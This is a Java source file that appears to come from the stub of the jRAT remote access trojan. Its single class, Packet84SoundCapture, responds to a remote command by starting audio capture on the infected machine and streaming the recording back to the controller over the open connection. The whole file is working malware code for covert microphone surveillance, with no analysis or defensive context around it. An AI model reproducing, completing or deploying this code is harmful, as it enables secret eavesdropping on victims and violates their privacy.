package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Sound;
import pro.jrat.stub.packets.outgoing.Packet58SoundCapture;

public class Packet84SoundCapture extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.readBoolean()) {
			Connection.addToSendQueue(new Packet58SoundCapture());
			Sound.initialize();
			Sound.write(Connection.dos);
			
			Connection.lock();
		} else {
			Connection.addToSendQueue(new Packet58SoundCapture());
			Sound.write(Connection.dos);
			
			Connection.lock();
		}
	}

}
